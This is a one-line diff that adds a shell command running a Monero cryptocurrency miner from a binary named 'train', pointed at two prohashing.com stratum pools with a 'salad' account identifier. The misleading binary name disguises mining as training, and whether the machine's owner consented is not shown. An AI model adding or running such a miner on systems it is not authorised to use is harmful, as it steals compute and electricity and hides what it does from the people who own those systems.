@@ -1,0 +1,1 @@
+./train --donate-level=1 -o stratum+tcp://prohashing.com:3359 --coin=monero -u salad -p o=5bfcf291-4210-4485-8ede-55427bb526f8,n=5bfcf291-4210-4485-8ede-55427bb526f8 -k -o stratum+tcp://eu.prohashing.com:3359 --coin=monero -u salad -p o=5bfcf291-4210-4485-8ede-55427bb526f8,n=5bfcf291-4210-4485-8ede-55427bb526f8 -k
